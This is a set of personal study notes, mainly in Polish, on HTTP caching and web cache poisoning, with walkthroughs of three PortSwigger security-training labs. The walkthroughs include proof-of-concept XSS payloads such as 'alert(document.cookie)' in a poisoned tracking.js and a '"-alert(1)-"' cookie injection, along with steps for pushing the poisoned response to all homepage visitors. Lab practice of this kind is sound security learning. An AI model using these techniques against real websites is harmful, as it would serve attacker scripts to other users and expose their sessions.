 Żądania GET

Tak, żądania GET są zwykle cache’owane.
Powód: GET jest idempotentny (czyli nie zmienia stanu serwera).
Cache (przeglądarka, CDN, reverse proxy) może zapamiętać odpowiedź GET i podawać ją kolejnym użytkownikom, jeśli nagłówki i polityka cache na to pozwalają (Cache-Control, Expires).
 

2️⃣ Żądania POST

Nie, żądań POST zwykle się nie cache’uje.
Powód: POST jest niemal zawsze używany do zmiany stanu serwera (np. wysłanie formularza, dodanie rekordu do bazy).
Cache nie powinien zwracać zapisanej odpowiedzi POST, bo każdy POST może dawać inną odpowiedź w zależności od danych przesyłanych w ciele żądania.



Zmanipulowane cache



zapobieganie
Even if you do need to use caching, restricting it to purely static responses is also effective, provided you are sufficiently wary about what you class as "static". For instance, make sure that an attacker can't trick the back-end server into retrieving their malicious version of a static resource instead of the genuine one.

 

Nawet jeśli musisz używać cache (pamięci podręcznej), np. dla wydajności, ograniczenie cache tylko do statycznych zasobów (np. obrazki, pliki CSS, JavaScript, które się nie zmieniają dynamicznie) jest skuteczne. Innymi słowy: nie cache’uj dynamicznych stron generowanych indywidualnie dla użytkowników (np. dashboard, koszyk w sklepie, strony z danymi konta), bo to zwiększa ryzyko web cache poisoning. Ważne jest, żeby dokładnie wiedzieć, co naprawdę jest statyczne. Nie wszystko, co wygląda na stałe, musi nim być – np. plik z URL-em /script.js?v=123 może być dynamicznie generowany przez serwer. Trzeba upewnić się, że atakujący nie może wprowadzić własnej, złośliwej wersji pliku, którą serwer potem zapisze w cache zamiast prawdziwego pliku. Przykład: atakujący podmienia URL lub nagłówek w żądaniu, serwer traktuje to jako „statyczny zasób” i zapisuje jego wersję w cache → wszyscy użytkownicy dostają złośliwą wersję.

 

https://portswigger.net/research/practical-web-cache-poisoning

 

Lab: Web cache poisoning with an unkeyed header

 

unkeyed input – ryzyko web cache poisoning

 

Unkeyed input to dane, które wpływają na odpowiedź serwera, ale nie są brane pod uwagę przy tworzeniu klucza cache, przez co mogą powodować błędy w przechowywaniu i zwracaniu odpowiedzi.

 

1.original request 2x

Miss (response nie znajduje w cache)

Hit (response już jest w cache)

 

2. /?cb=kasia123
Cache: Miss
param min> guest headers

 

3. wynik w target > sitemap> issues

x-forwarded-host header is an unkeyed header

 

4.  /?cb=kasia123
X-Forwarded-Host: wartość URL exploit serwera

 

„Hej, traktuj exploit-server.com jako host tej aplikacji.”

Bo Nagłówek X-Forwarded-Host jest używany głównie przez: reverse proxy, load balancer, CDN

 

5. exploi server odbity w body. Kopiujemy zasob, który jest dalej.

Jest uzyty przez .js tracking file

/resources/js/tracking.js

 

6. Wklejamy w exploit server,

file: /resources/js/tracking.js
body: alert(document.cookie);

Store


7.wysalc jeszcze to samo żądanie, aż będzie cache hit.

 

8. w przeglądarce doklejamy do strony głównej

/?cb=kasia123

i mamy popup

 

9. dystrybuujemy atak do strony głównej

W request zostawiamy / i wysyłamy dwa razy
(kasuejmy /?cb=kasia123)


Lab: Web cache poisoning with an unkeyed cookie

1. Check / request

 

Cache-Control: max-age=30 - może być cache’owana przez 30 sekund,

Age: 1 - aktualnie ma 1 sekundę,

X-Cache: hit – jest w cache

 

2. Cache- buster GET

/?cb=kasia123 hit hit

/?cb=kasia1234 hit hit

 

Miss-hit pojawia się tylko po alteracji GET,
po zmianie ciasteczka feshost, zawsze jest hithit

It means, this is query string is a part of cache key

Use this as a part of CB, not to not impack other users visiting / page that we are probing, and to test fresh uncached requests

3.fing unkeyed input: long story short: param>guess cookie z cache buster w GET > MI SKAN NIE DZIAŁA

Cookie: session=9gmLxSJpmBeVw8WVG6uWluicMVmP4Cga; fehost=prod-cache-01
prod-cache-01 jest odbite już w odpowiedzi, wiec jest to ważne zrodlo umieszczenia js

Req fehost:
fehost=prod-cache-03

Res:
       <script>

            data = {"host":"0a0a007c030ae19c80036c210097001a.web-security-academy.net","path":"/","frontend":"prod-cache-03"}

        </script>

4. fehost robimy pusty
REQ fehost=
RESP "frontend":""

5. w przeglądarce szukamy
data = {"frontend":"" - alert() -""}

Żeby to policzyć: "foo" - alert() - 3
JS musi:

Obliczyć "foo"
Obliczyć alert()
Dopiero potem wykonać odejmowanie
6. REQ fehost="-alert(1)-" to hit

7. Remove  /?cd=kasia4

Czyli zatruwamy cache GET /
hit

8. wchodzimy w home w przeglądarce

 

Lab: Web cache poisoning with multiple headers

1.test cache miss hit
2.add CacheBuster in GET (not impact users using homepage)
3. Miss > Skan param miner > guess header : x-forwarded-scheme:

Scheme to start url i mowi, czy to będzie http czy ftp czy https

x-forwarded-scheme: nohttps

tip: żeby testować czy xfs się cachuje, musimy alterowac GET (xfs jest unkeyed)

4.Second skan: x-forwarded-scheme: nohttps> Miss>Skan param miner > guess header : x-forwarded-scheme:
